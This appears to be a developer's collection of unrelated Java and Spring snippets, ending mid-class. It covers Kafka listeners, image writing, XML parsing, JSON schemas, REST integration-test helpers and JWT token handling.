import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.kafka.annotation.KafkaListener;
import org.springframework.kafka.support.KafkaHeaders;
import org.springframework.messaging.handler.annotation.Header;

public class Receiver {

  private static final Logger LOGGER = LoggerFactory.getLogger(Receiver.class);

  public static final int COUNT = 20;

  private CountDownLatch latch = new CountDownLatch(COUNT);

  public CountDownLatch getLatch() {
    return latch;
  }

  @KafkaListener(id = "batch-listener", topics = "${kafka.topic.batch}")
  public void receive(List<String> data,
      @Header(KafkaHeaders.RECEIVED_PARTITION_ID) List<Integer> partitions,
      @Header(KafkaHeaders.OFFSET) List<Long> offsets) {
    LOGGER.info("start of batch receive");
    for (int i = 0; i < data.size(); i++) {
      LOGGER.info("received message='{}' with partition-offset='{}'", data.get(i),
          partitions.get(i) + "-" + offsets.get(i));
      // handle message

      latch.countDown();
    }
    LOGGER.info("end of batch receive");
  }
}
-----------------------------------------------------------------------------------------
import javax.imageio.IIOImage;
import javax.imageio.ImageIO;
import javax.imageio.ImageWriteParam;
import javax.imageio.ImageWriter;
import javax.imageio.stream.ImageOutputStream;
import java.awt.image.BufferedImage;
import java.io.*;
import java.util.Iterator;

/**
 * <p>Writes out BufferedImages to some outputstream, like a file. Allows image writer parameters to be specified and
 * thus controlled. Uses the java ImageIO libraries--see {@link javax.imageio.ImageIO} and related classes,
 * especially {@link javax.imageio.ImageWriter}.</p>
 * <p/>
 * By default, FSImageWriter writes BufferedImages out in PNG format. The simplest possible usage is
 * <pre>
 * FSImageWriter writer = new FSImageWriter();
 * writer.write(img, new File("image.png"));
 * </pre>
 * <p/>
 * <p>You can set the image format in the constructore ({@link org.xhtmlrenderer.util.FSImageWriter#FSImageWriter(String)},
 * and can set compression settings using various setters; this lets you create writer to reuse across a number
 * of images, all output at the same compression level. Note that not all image formats support compression. For
 * those that do, you may need to set more than one compression setting, in combination, for it to work. For JPG,
 * it might look like this</p>
 * <pre>
 *      writer = new FSImageWriter("jpg");
 * 		writer.setWriteCompressionMode(ImageWriteParam.MODE_EXPLICIT);
 * 		writer.setWriteCompressionType("JPEG");
 * 		writer.setWriteCompressionQuality(.75f);
 * </pre>
 * <p>The method {@link #newJpegWriter(float)} creates a writer for JPG images; you just need to specify the
 * output quality. Note that for the JPG format, your image or BufferedImage shouldn't be ARGB.</p>
 */
public class FSImageWriter {
    private String imageFormat;
    private float writeCompressionQuality;
    private int writeCompressionMode;
    private String writeCompressionType;
    public static final String DEFAULT_IMAGE_FORMAT = "png";


    /**
     * New image writer for the PNG image format
     */
    public FSImageWriter() {
        this("png");
    }

    /**
     * New writer for a given image format, using the informal format name.
     *
     * @param imageFormat Informal image format name, e.g. "jpg", "png", "bmp"; usually the part that appears
     *                    as the file extension.
     */
    public FSImageWriter(String imageFormat) {
        this.imageFormat = imageFormat;
        this.writeCompressionMode = ImageWriteParam.MODE_COPY_FROM_METADATA;
        this.writeCompressionType = null;
        this.writeCompressionQuality = 1.0f;
    }

    /**
     * Convenience method for initializing a writer for the JPEG image format.
     *
     * @param quality level of compression, between 0 and 1; 0 is lowest, 1 is highest quality.
     * @return a writer for JPEG images
     */
    public static FSImageWriter newJpegWriter(float quality) {
        FSImageWriter writer = new FSImageWriter("jpg");
        writer.setWriteCompressionMode(ImageWriteParam.MODE_EXPLICIT);
        writer.setWriteCompressionType("JPEG");
        writer.setWriteCompressionQuality(quality);
        return writer;
    }

    /**
     * Writes the image out to the target file, creating the file if necessary, or overwriting if it already
     * exists.
     *
     * @param bimg     Image to write.
     * @param filePath Path for file to write. The extension for the file name is not changed; it is up to the
     *                 caller to make sure this corresponds to the image format.
     * @throws IOException If the file could not be written.
     */
    public void write(BufferedImage bimg, String filePath) throws IOException {
        File file = new File(filePath);
        if (file.exists()) {
            if (!file.delete()) {
                throw new IOException("File " + filePath + " exists already, and call to .delete() failed " +
                        "unexpectedly");
            }
        } else {
            if (!file.createNewFile()) {
                throw new IOException("Unable to create file at path " + filePath + ", call to .createNewFile() " +
                        "failed unexpectedly.");
            }
        }

        OutputStream fos = new BufferedOutputStream(new FileOutputStream(file));
        try {
            write(bimg, fos);
        } finally {
            try {
                fos.close();
            } catch (IOException e) {
                // ignore
            }
        }
    }

    /**
     * Writes the image out to the target file, creating the file if necessary, or overwriting if it already
     * exists.
     *
     * @param bimg     Image to write.
     * @param os outputstream to write to
     * @throws IOException If the file could not be written.
     */
    public void write(BufferedImage bimg, OutputStream os) throws IOException {
        ImageWriter writer = null;
        ImageOutputStream ios = null;
        try {
            writer = lookupImageWriterForFormat(imageFormat);
            ios = ImageIO.createImageOutputStream(os);
            writer.setOutput(ios);
            ImageWriteParam iwparam = getImageWriteParameters(writer);

            writer.write(null, new IIOImage(bimg, null, null), iwparam);
        } finally {
            if (ios != null) {
                try {
                    ios.flush();
                } catch (IOException e) {
                    // ignore
                }
                try {
                    ios.close();
                } catch (IOException e) {
                    // ignore
                }
            }
            if (writer != null) {
                writer.dispose();
            }
        }
    }

    /**
     * Returns the image output parameters to control the output image quality, compression, etc. By default
     * this uses the compression values set in this class. Override this method to get full control over the
     * ImageWriteParam used in image output.
     *
     * @param writer The ImageWriter we are going to use for image output.
     * @return ImageWriteParam configured for image output.
     */
    protected ImageWriteParam getImageWriteParameters(ImageWriter writer) {
        ImageWriteParam param = writer.getDefaultWriteParam();
        if (param.canWriteCompressed()) {
            if (writeCompressionMode != ImageWriteParam.MODE_COPY_FROM_METADATA) {
                param.setCompressionMode(writeCompressionMode);

                // see docs for IWP--only allowed to set type and quality if mode is EXPLICIT
                if (writeCompressionMode == ImageWriteParam.MODE_EXPLICIT) {
                    param.setCompressionType(writeCompressionType);
                    param.setCompressionQuality(writeCompressionQuality);
                }

            }
        }

        return param;
    }

    /**
     * Compression quality for images to be generated from this writer. See
     * {@link javax.imageio.ImageWriteParam#setCompressionQuality(float)} for a description of what this means
     * and valid range of values.
     *
     * @param q Compression quality for image output.
     */
    public void setWriteCompressionQuality(float q) {
        writeCompressionQuality = q;
    }

    /**
     * Compression mode for images to be generated from this writer. See
     * {@link javax.imageio.ImageWriteParam#setCompressionMode(int)}  for a description of what this means
     * and valid range of values.
     *
     * @param mode Compression mode for image output.
     */
    public void setWriteCompressionMode(int mode) {
        this.writeCompressionMode = mode;
    }

    /**
     * Compression type for images to be generated from this writer. See
     * {@link javax.imageio.ImageWriteParam#setCompressionType(String)} for a description of what this means
     * and valid range of values.
     *
     * @param type Type of compression for image output.
     */
    public void setWriteCompressionType(String type) {
        this.writeCompressionType = type;
    }

    /**
     * Utility method to find an imagewriter.
     *
     * @param imageFormat String informal format name, "jpg"
     * @return ImageWriter corresponding to that format, null if not found.
     */
    private ImageWriter lookupImageWriterForFormat(String imageFormat) {
        ImageWriter writer = null;
        Iterator iter = ImageIO.getImageWritersByFormatName(imageFormat);
		if (iter.hasNext()) {
			writer = (ImageWriter) iter.next();
		}
		return writer;
	}
}
-----------------------------------------------------------------------------------------
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.sql.ResultSet;

public class TrimmingResultSetInvocationHandler implements InvocationHandler {

	private final ResultSet resultSet;
	
	public TrimmingResultSetInvocationHandler(ResultSet resultSet) {
		this.resultSet = resultSet;
	}
	@Override
	public Object invoke(Object proxy, Method method, Object[] args)
			throws Throwable {
		Object retValue = method.invoke(resultSet, args);
		return retValue instanceof String?((String)retValue).trim():retValue;
	}

}
-----------------------------------------------------------------------------------------
import java.io.File;
import java.io.StringReader;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

import org.w3c.dom.Document;
import org.xml.sax.InputSource;

/**
 * Booch utility class for XML processing using DOM
 */
public class XMLUtil {

    public static Document documentFromString(final String documentContents)
        throws Exception {

        return createDocumentBuilder().parse(new InputSource(new StringReader(documentContents)));
    }

    public static Document documentFromFile(final String filename)
        throws Exception {

        return createDocumentBuilder().parse(new File(filename).toURI().toURL().openStream());
    }

    private static DocumentBuilder createDocumentBuilder()
        throws ParserConfigurationException {

        DocumentBuilderFactory fact = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = fact.newDocumentBuilder();

        builder.setErrorHandler( null );

        return builder;
    }
}
-----------------------------------------------------------------------------------------
"OAuth2": {
  "type": "oauth2",
  "flow": "accessCode",
  "authorizationUrl": "https://your-auth-domain.com/oauth/authorize",
  "tokenUrl": "https://your-auth-domain.com/oauth/token",
  "scopes": {
    "read": "Grants read access to user resources",
    "write": "Grants write access to user resources",
    "admin": "Grants read and write access to administrative information"
  }
}
-----------------------------------------------------------------------------------------
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

/**
 * Use to map Form Bean property with UI form fields.
 * com.qmetry.qaf.automation.core.ui.annotations.UiElement.java
 * 
 * @author chirag
 */

@Target(value = ElementType.FIELD)
@Retention(RetentionPolicy.RUNTIME)
public @interface FindBy {

	/**
	 * specify locator in conventional selenium 1 way.
	 * 
	 * @return
	 */
	public String locator();
}

import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

import com.qmetry.qaf.automation.data.BaseFormDataBean;
import com.qmetry.qaf.automation.ui.webdriver.QAFExtendedWebElement;

/**
 * Use to map Form Bean property with UI form fields.
 * com.qmetry.qaf.automation.core.ui.annotations.UiElement.java
 * 
 * @author chirag
 */

@Target(value = ElementType.FIELD)
@Retention(RetentionPolicy.RUNTIME)
public @interface UiElement {
	public enum Type {

		textbox,
		selectbox,
		checkbox,
		file,
		/**
		 * Radio button(s)
		 */
		optionbox,
		textarea,
		multiselectbox,
		/**
		 * HTML element other than form field
		 */
		text;
	}

	/**
	 * specify locator of form field.
	 * 
	 * @return
	 */
	public String fieldLoc();

	/**
	 * specify type of form field. Default is {@link Type#textbox}
	 * 
	 * @return
	 */
	public Type fieldType() default Type.textbox;

	/**
	 * mapping with data-view : if this form field value reflected in other view
	 * page then specify locator of that field
	 * 
	 * @return
	 */
	public String viewLoc() default "";

	/**
	 * specify type of view element. default is {@link Type#text}
	 * 
	 * @return
	 */
	public Type viewType() default Type.text;

	public String defaultValue() default "";

	/**
	 * specify filed name on which this field is depends. This is use full in
	 * case of parent-child fields where child filed enabled/appears depending
	 * on value of parent field.
	 * 
	 * @return
	 */
	public String dependsOnField() default "";

	/**
	 * Specify value of parent field which enables this field. Used with
	 * {@link #dependsOnField()}. You can use JavaScript notation for value
	 * comparison. Some valid Example:
	 * 
	 * <pre>
	 * <code>	
	 * &#64;UiElement(fieldLoc = DOMAIN_SELECT_LOC, fieldType = Type.selectbox, order = 1)
	 * private String domain;
	 * 	
	 * &#64;UiElement(fieldLoc = NAME_INPUT_LOC, fieldType = Type.selectbox, dependsOnField = "domain", dependingValue = "DUNS", order=3)
	 * public String name;
	 * </code>
	 * <code>		
	 * This can also be written as:
	 * &#64;UiElement(fieldLoc = NAME_INPUT_LOC, fieldType = Type.selectbox, dependsOnField = "domain", dependingValue = "${domain}=='DUNS'", order=3)
	 * public String name;
	 * </code>
	 * &#64;UiElement(fieldLoc = PASSWORD_INPUT_LOC, fieldType = Type.selectbox, dependsOnField = "domain", dependingValue = "${domain}!='DUNS' && ${domain}!='GLN'", order=3)
	 * public String password;
	 * </pre>
	 * 
	 * <br>
	 * Make sure that you have specified {@link #order()} of parent filed less
	 * then child field.
	 * 
	 * @return
	 */
	public String dependingValue() default "";

	/**
	 * specify whether this form field is read-only? Default is false.
	 * 
	 * @return
	 */
	public boolean readonly() default false;

	/**
	 * specify whether is this a required form field? Default is false. It is
	 * used when you want to fill just required form fields.
	 * 
	 * @see BaseFormDataBean#fillUiRequiredElements()
	 * @return
	 */
	public boolean required() default false;

	/**
	 * Specify the order in which form fields should be filled in UI. Default is
	 * {@link Integer#MAX_VALUE}
	 * 
	 * @return
	 */
	public int order() default Integer.MAX_VALUE;

	/**
	 * Specify whether wait for page load required or not, after fill UI data.
	 * Default is false
	 * @deprecated
	 * @return
	 */
	public boolean pagewait() default false;

	/**
	 * Optional, can be used to specify custom component to interact with UI. In case
	 * of custom component, it must have constructor with one argument as string
	 * to accept locator
	 * 
	 * @since 2.1.9
	 * @return
	 */
	public Class<? extends QAFExtendedWebElement> elementClass() default QAFExtendedWebElement.class;

}
-----------------------------------------------------------------------------------------
	/**
	 * 
	 * @param expression
	 * @return
	 * @throws ScriptException
	 */
	public static <T> T eval(String expression) throws ScriptException {
		return eval(expression, new HashMap<String, Object>());
	}

	/**
	 * 
	 * @param expression
	 * @param context
	 * @return
	 * @throws ScriptException
	 */
	@SuppressWarnings("unchecked")
	public static <T> T eval(String expression, Map<? extends String, ? extends Object> context)
			throws ScriptException {
		ScriptEngineManager engineManager = new ScriptEngineManager();
		ScriptEngine jsEngine = engineManager.getEngineByName("JavaScript");
		jsEngine.getBindings(ScriptContext.ENGINE_SCOPE).putAll(context);
		return (T) jsEngine.eval(expression);
	}
-----------------------------------------------------------------------------------------
/**
 * Tiles configuration.
 * 
 * References: http://docs.spring.io/spring/docs/4.0.6.RELEASE/spring-framework-reference/html/view.html#view-tiles-integrate
 * 
 * @author Mark Meany
 */
@Configuration
public class ConfigurationForTiles {

    /**
     * Initialise Tiles on application startup and identify the location of the tiles configuration file, tiles.xml.
     * 
     * @return tiles configurer
     */
    @Bean
    public TilesConfigurer tilesConfigurer() {
        final TilesConfigurer configurer = new TilesConfigurer();
        configurer.setDefinitions(new String[] { "WEB-INF/tiles/tiles.xml" });
        configurer.setCheckRefresh(true);
        return configurer;
    }

    /**
     * Introduce a Tiles view resolver, this is a convenience implementation that extends URLBasedViewResolver.
     * 
     * @return tiles view resolver
     */
    @Bean
    public TilesViewResolver tilesViewResolver() {
        final TilesViewResolver resolver = new TilesViewResolver();
        resolver.setViewClass(TilesView.class);
        return resolver;
    }
}
-----------------------------------------------------------------------------------------
spring.jpa.database-platform=org.hibernate.dialect.MySQL5Dialect

################### DATASOURCE :  数据库 mysql 用于生产中 ##########################
# 默认使用  Tomcat pooling，数据源可以 通过 spring.datasource 进一步设置
spring.datasource.url=jdbc:mysql://localhost:3306/ztree?autoReconnect=true&useSSL=false
spring.datasource.username=ztree
spring.datasource.password=ztree
#spring.datasource.driver-class-name=com.mysql.jdbc.Driver 可以不指定,spring boot 可以自动从 url 分析得到
#
spring.datasource.max-active= 20
spring.datasource.max-idle= 1
spring.datasource.max-wait= 1
spring.datasource.min-idle=1
#  min-evictable-idle-time-millis :配置一个连接在池中最小生存的时间，单位是毫秒
spring.datasource.min-evictable-idle-time-millis= 300000
# time-between-eviction-runs-millis : 配置间隔多久才进行一次检测需要关闭的空闲连接，单位是毫秒
spring.datasource.time-between-eviction-runs-millis= 60000
spring.datasource.test-on-borrow= false
spring.datasource.test-on-return= false
spring.datasource.test-while-idle= true
#默认用的 tomcat jdbc poll,其中 validation-query=
#mysql:  SELECT 1
#oracle : select 1 from dual
#MS Sql Server : SELECT 1
spring.datasource.validation-query=SELECT 1
-----------------------------------------------------------------------------------------

import com.igormaznitsa.meta.annotation.Weight;
import com.igormaznitsa.meta.common.exceptions.MetaErrorListeners;
import java.io.ByteArrayOutputStream;
import java.io.Closeable;
import java.util.zip.DataFormatException;
import java.util.zip.Deflater;
import java.util.zip.Inflater;
import javax.annotation.Nonnull;
import javax.annotation.Nullable;
import javax.annotation.concurrent.ThreadSafe;

/**
 * Auxiliary methods for IO operations.
 *
 * @since 1.0
 */
@ThreadSafe
public final class IOUtils {

  private IOUtils() {
  }

  /**
   * Pack some binary data.
   *
   * @param data data to be packed
   * @return packed data as byte array
   * @since 1.0
   */
  @Nonnull
  @Weight(Weight.Unit.VARIABLE)
  public static byte[] packData(@Nonnull final byte[] data) {
    final Deflater compressor = new Deflater(Deflater.BEST_COMPRESSION);
    compressor.setInput(Assertions.assertNotNull(data));
    compressor.finish();
    final ByteArrayOutputStream resultData = new ByteArrayOutputStream(data.length + 100);

    final byte[] buffer = new byte[1024];
    while (!compressor.finished()) {
      resultData.write(buffer, 0, compressor.deflate(buffer));
    }

    return resultData.toByteArray();
  }

  /**
   * Unpack binary data packed by the packData method.
   *
   * @param data packed data array
   * @return unpacked byte array
   * @throws IllegalArgumentException it will be thrown if the data has wrong format, global error listeners will be also notified
   * @see #packData(byte[])
   * @since 1.0
   */
  @Nonnull
  @Weight(Weight.Unit.VARIABLE)
  public static byte[] unpackData(@Nonnull final byte[] data) {
    final Inflater decompressor = new Inflater();
    decompressor.setInput(Assertions.assertNotNull(data));
    final ByteArrayOutputStream outStream = new ByteArrayOutputStream(data.length * 2);
    final byte[] buffer = new byte[1024];
    try {
      while (!decompressor.finished()) {
        outStream.write(buffer, 0, decompressor.inflate(buffer));
      }
      return outStream.toByteArray();
    } catch (DataFormatException ex) {
      MetaErrorListeners.fireError("Can't unpack data for wrong format", ex);
      throw new IllegalArgumentException("Wrong formatted data", ex);
    }
  }

  /**
   * Closing quetly any closeable object. Any exception will be caught (but global error listeners will be notified)
   *
   * @param closeable object to be closed quetly
   * @return the same object provided in args
   * @since 1.0
   */
  @Weight(Weight.Unit.LIGHT)
  @Nullable
  public static Closeable closeQuetly(@Nullable final Closeable closeable) {
    if (closeable != null) {
      try {
        closeable.close();
      } catch (Exception ex) {
        MetaErrorListeners.fireError("Exception in closeQuetly", ex);
      }
    }
    return closeable;
  }
}
-----------------------------------------------------------------------------------------
TransactionSupportAsyncJobServiceTest.test_async_job_execute:112 
-----------------------------------------------------------------------------------------
paragon.mailingcontour.commons
paragon.mailingcontour.autotests
paragon.mailingcontour.freecoupons
paragon.mailingcontour.crmadapter
paragon.mailingcontour.distributor
paragon.mailingcontour.mailer
paragon.mailingcontour.documents.generator
paragon.mailingcontour.confirmationlink.callback
paragon.mailingcontour.bounceparser
paragon.mailingcontour.crmmailadapter
paragon.mailingcontour.confirmationlink
paragon.mailingcontour.links

{
	"sku": <sku>,
	"name": <name>,
	"versions":
	[{
		"version": <version>,
		"locale": <locale>,
		"changelog": <changelog>,
		"files":
		[{
			"fileName": <file-name>,
			"filePath": <file-path>,
			"filePlatform": <file-platform>
		}]
	}]
}

{
	"sku": <sku>,
	"name": <name>
}

{
	"productId": <product-id>,
	"fileName": <file-name>,
	"filePath": <file-path>
	"platform": <platform>
}

sku=PSG-1770-BSU-SE-TL-1Y&locale=ru&platform=x86
-----------------------------------------------------------------------------------------
	@DeprecatedConfigurationProperty(reason = "replaced to support additional strategies",
			replacement = "server.forward-headers-strategy")
-----------------------------------------------------------------------------------------
import ngSpring.demo.domain.dto.UserProfileDTO;
import ngSpring.demo.domain.entities.User;
import ngSpring.demo.repositories.UserRepository;
import ngSpring.demo.transformer.GenericTransformer;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Component;

@Component
public class UserProfileTransformer extends GenericTransformer<User, UserProfileDTO> {

    @Autowired
    private UserRepository userRepository;

    @Override
    public User transformToEntity(UserProfileDTO dto) {
        PasswordEncoder passwordEncoder = new BCryptPasswordEncoder();
        return User.builder()
                .userId(dto.getUserId())
                .username(dto.getUsername())
                .password(dto.getPassword() != null ? passwordEncoder.encode(dto.getPassword()) : this.userRepository.findByUserIdAndDeletedFalse(dto.getUserId()).getPassword())
                .build();
    }

    @Override
    public UserProfileDTO transformToDTO(User user) {
        return UserProfileDTO.builder()
                .userId(user.getUserId())
                .username(user.getUsername())
                .build();
    }
}
-----------------------------------------------------------------------------------------
   @ExceptionHandler(ValidationException.class)
    @ResponseBody
    public ResponseEntity<?> handleBadRequestException(ValidationException ex) {
        LOG.error("Got validation errors", ex);
        if (ex.getValidationMessages() == null || ex.getValidationMessages().isEmpty()) {
            return new ResponseEntity<Message>(new Message(ex.getMessage()), HttpStatus.BAD_REQUEST);
        } else {
            return new ResponseEntity<List<ValidationMessage>>(ex.getValidationMessages(), HttpStatus.BAD_REQUEST);
        }
    }
	
	    private List<ValidationMessage> getValidationErrorResponse(ConstraintViolationException constraintViolationException) {
        final List<ValidationMessage> validationErrors = new ArrayList<>();
        LOG.error("Got validation errors", constraintViolationException);
        for (ConstraintViolation<?> violationSet : constraintViolationException.getConstraintViolations()) {
            List<String> propertyList = new ArrayList<>();
            Iterator<Path.Node> propertyIterator = violationSet
                    .getPropertyPath().iterator();
            while (propertyIterator.hasNext()) {
                propertyList.add(propertyIterator.next().getName());
            }
            // add violations errors in response
            validationErrors.add(ValidationMessage.builder()
                    .entity(violationSet.getRootBeanClass().getName())
                            // remove { and }
                    .messageTemplate(violationSet.getMessageTemplate().replaceAll("^[{]|[}]$", ""))
                    .propertyList(propertyList).build());
        }
        return validationErrors;
    }
-----------------------------------------------------------------------------------------
import com.fasterxml.jackson.databind.ObjectMapper;
import com.jayway.restassured.RestAssured;
import com.jayway.restassured.specification.RequestSpecification;
import ngSpring.demo.AngularSpringApplication;
import ngSpring.demo.domain.entities.User;
import ngSpring.demo.repositories.EventRepository;
import ngSpring.demo.repositories.UserRepository;
import org.junit.After;
import org.junit.Before;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.IntegrationTest;
import org.springframework.boot.test.SpringApplicationConfiguration;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
import org.springframework.test.context.web.WebAppConfiguration;

import java.text.ParseException;
import java.util.HashMap;
import java.util.Map;

import static com.jayway.restassured.RestAssured.given;

@RunWith(SpringJUnit4ClassRunner.class)
@ActiveProfiles("test")
@SpringApplicationConfiguration(classes = AngularSpringApplication.class)
@WebAppConfiguration
@IntegrationTest("server.port:0")
public abstract class RestITBase {

    @Autowired
    private EventRepository eventRepository;

    @Autowired
    private UserRepository userRepository;

    @Value("${local.server.port}")
    protected int port;

    @Before
    public void setUp() throws ParseException {
        RestAssured.port = port;
        userRepository.save(User.builder()
                .enabled(true)
                .username("user")
                .password(new BCryptPasswordEncoder().encode("password"))
                .build());
    }

    @After
    public void clean() {
        try {
            this.userRepository.deleteAll();
            this.eventRepository.deleteAll();
        } catch (Exception ignored) {
        }
    }

    protected UserRepository getUserRepository() {
        return userRepository;
    }

    public EventRepository getEventRepository() {
        return eventRepository;
    }

    protected int getPort() {
        return port;
    }

    protected RequestSpecification login(String user, String password) {
        return given().auth().preemptive().basic(user, password).redirects()
                .follow(false);
    }

    protected String toJSON(Object entity) {
        try {
            ObjectMapper mapper = new ObjectMapper();
            return mapper.writeValueAsString(entity);
        } catch (Exception e) {
            return "";
        }
    }

    protected String toJSON(Map<String, String> map) {
        try {
            ObjectMapper mapper = new ObjectMapper();
            return mapper.writeValueAsString(map);
        } catch (Exception ignored) {
            return "";
        }
    }

    // HELPERS
    protected RequestSpecification loginWithCorrectCredentials() {
        return login("user", "password");
    }

    protected RequestSpecification loginWithIncorrectCredentials() {
        return login("user", "blub");
    }

    protected RequestSpecification loginWithEmptyCredentials() {
        return given().auth().none().redirects().follow(false);
    }

    public class JSONBuilder {

        private Map<String, String> properties = new HashMap<String, String>();

        public JSONBuilder add(String key, String value) {
            this.properties.put(key, value);
            return this;
        }

        public String build() {
            return toJSON(this.properties);
        }
    }

}

{
	"id": <id>,
	"filepath": <file-path>,
	"filename": <file-name>,
	"downloadStatus": "NEW | DOWNLOADING | FINISHED | INVALID | INTERRUPTED"
}
-----------------------------------------------------------------------------------------
rf mondial
digiton

-----------------------------------------------------------------------------------------
  protected String createJSON(Object object) throws JsonProcessingException {
        ObjectMapper mapper = new ObjectMapper();
        SimpleDateFormat outputFormat = new SimpleDateFormat("dd MMM yyyy");
        mapper.configure(SerializationFeature.INDENT_OUTPUT, true);
        mapper.configure(SerializationFeature.ORDER_MAP_ENTRIES_BY_KEYS, true);
        mapper.setDateFormat(outputFormat);
        mapper.setSerializationInclusion(Include.NON_EMPTY);
        return mapper.writeValueAsString(object);
    }
	
	
	   protected RequestSpecification login(String user, String password) {
        return given().auth().preemptive().basic(user, password).redirects()
                .follow(false);
    }
-----------------------------------------------------------------------------------------
import org.springframework.security.authentication.AbstractAuthenticationToken;
import org.springframework.security.core.userdetails.UserDetails;


/**
 * Created by fan.jin on 2016-11-11.
 */
public class TokenBasedAuthentication extends AbstractAuthenticationToken {

    private String token;
    private final UserDetails principle;

    public TokenBasedAuthentication( UserDetails principle ) {
        super( principle.getAuthorities() );
        this.principle = principle;
    }

    public String getToken() {
        return token;
    }

    public void setToken( String token ) {
        this.token = token;
    }

    @Override
    public boolean isAuthenticated() {
        return true;
    }

    @Override
    public Object getCredentials() {
        return token;
    }

    @Override
    public UserDetails getPrincipal() {
        return principle;
    }

}
 
 
 
 
 
 
import com.bfwg.common.TimeProvider;
import com.bfwg.model.User;
import io.jsonwebtoken.Claims;
import io.jsonwebtoken.Jwts;
import io.jsonwebtoken.SignatureAlgorithm;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.mobile.device.Device;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.stereotype.Component;

import javax.servlet.http.HttpServletRequest;
import java.util.Date;


/**
 * Created by fan.jin on 2016-10-19.
 */

@Component
public class TokenHelper {

    @Value("${app.name}")
    private String APP_NAME;

    @Value("${jwt.secret}")
    public String SECRET;

    @Value("${jwt.expires_in}")
    private int EXPIRES_IN;

    @Value("${jwt.mobile_expires_in}")
    private int MOBILE_EXPIRES_IN;

    @Value("${jwt.header}")
    private String AUTH_HEADER;

    static final String AUDIENCE_UNKNOWN = "unknown";
    static final String AUDIENCE_WEB = "web";
    static final String AUDIENCE_MOBILE = "mobile";
    static final String AUDIENCE_TABLET = "tablet";

    @Autowired
    TimeProvider timeProvider;

    private SignatureAlgorithm SIGNATURE_ALGORITHM = SignatureAlgorithm.HS512;

    public String getUsernameFromToken(String token) {
        String username;
        try {
            final Claims claims = this.getAllClaimsFromToken(token);
            username = claims.getSubject();
        } catch (Exception e) {
            username = null;
        }
        return username;
    }

    public Date getIssuedAtDateFromToken(String token) {
        Date issueAt;
        try {
            final Claims claims = this.getAllClaimsFromToken(token);
            issueAt = claims.getIssuedAt();
        } catch (Exception e) {
            issueAt = null;
        }
        return issueAt;
    }

    public String getAudienceFromToken(String token) {
        String audience;
        try {
            final Claims claims = this.getAllClaimsFromToken(token);
            audience = claims.getAudience();
        } catch (Exception e) {
            audience = null;
        }
        return audience;
    }

    public String refreshToken(String token, Device device) {
        String refreshedToken;
        Date a = timeProvider.now();
        try {
            final Claims claims = this.getAllClaimsFromToken(token);
            claims.setIssuedAt(a);
            refreshedToken = Jwts.builder()
                .setClaims(claims)
                .setExpiration(generateExpirationDate(device))
                .signWith( SIGNATURE_ALGORITHM, SECRET )
                .compact();
        } catch (Exception e) {
            refreshedToken = null;
        }
        return refreshedToken;
    }

    public String generateToken(String username, Device device) {
        String audience = generateAudience(device);
        return Jwts.builder()
                .setIssuer( APP_NAME )
                .setSubject(username)
                .setAudience(audience)
                .setIssuedAt(timeProvider.now())
                .setExpiration(generateExpirationDate(device))
                .signWith( SIGNATURE_ALGORITHM, SECRET )
                .compact();
    }

    private String generateAudience(Device device) {
        String audience = AUDIENCE_UNKNOWN;
        if (device.isNormal()) {
            audience = AUDIENCE_WEB;
        } else if (device.isTablet()) {
            audience = AUDIENCE_TABLET;
        } else if (device.isMobile()) {
            audience = AUDIENCE_MOBILE;
        }
        return audience;
    }

    private Claims getAllClaimsFromToken(String token) {
        Claims claims;
        try {
            claims = Jwts.parser()
                    .setSigningKey(SECRET)
                    .parseClaimsJws(token)
                    .getBody();
        } catch (Exception e) {
            claims = null;
        }
        return claims;
    }

    private Date generateExpirationDate(Device device) {
        long expiresIn = device.isTablet() || device.isMobile() ? MOBILE_EXPIRES_IN : EXPIRES_IN;
        return new Date(timeProvider.now().getTime() + expiresIn * 1000);
    }

    public int getExpiredIn(Device device) {
        return device.isMobile() || device.isTablet() ? MOBILE_EXPIRES_IN : EXPIRES_IN;
    }

    public Boolean validateToken(String token, UserDetails userDetails) {
        User user = (User) userDetails;
        final String username = getUsernameFromToken(token);
        final Date created = getIssuedAtDateFromToken(token);
        return (
                username != null &&
                username.equals(userDetails.getUsername()) &&
                        !isCreatedBeforeLastPasswordReset(created, user.getLastPasswordResetDate())
        );
    }

    private Boolean isCreatedBeforeLastPasswordReset(Date created, Date lastPasswordReset) {
        return (lastPasswordReset != null && created.before(lastPasswordReset));
    }

    public String getToken( HttpServletRequest request ) {
        /**
         *  Getting the token from Authentication header
         *  e.g Bearer your_token
         */
        String authHeader = getAuthHeaderFromHeader( request );
        if ( authHeader != null && authHeader.startsWith("Bearer ")) {
            return authHeader.substring(7);
        }

        return null;
    }

    public String getAuthHeaderFromHeader( HttpServletRequest request ) {
        return request.getHeader(AUTH_HEADER);
    }

}
 
 
 
import org.springframework.mobile.device.Device;
import org.springframework.mobile.device.DeviceUtils;
import org.springframework.stereotype.Component;

import javax.servlet.http.HttpServletRequest;

/**
 * Created by fanjin on 2017-10-16.
 */
@Component
public class DeviceProvider {

    public Device getCurrentDevice(HttpServletRequest request) {
        return DeviceUtils.getCurrentDevice(request);
    }
}
 
 
 
 
 
import com.fasterxml.jackson.annotation.JsonIgnore;
import org.springframework.security.core.GrantedAuthority;

import javax.persistence.*;

/**
 * Created by fan.jin on 2016-11-03.
 */

@Entity
@Table(name="AUTHORITY")
public class Authority implements GrantedAuthority {

    @Id
    @Column(name="id")
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    Long id;

    @Column(name="name")
    String name;

    @Override
    public String getAuthority() {
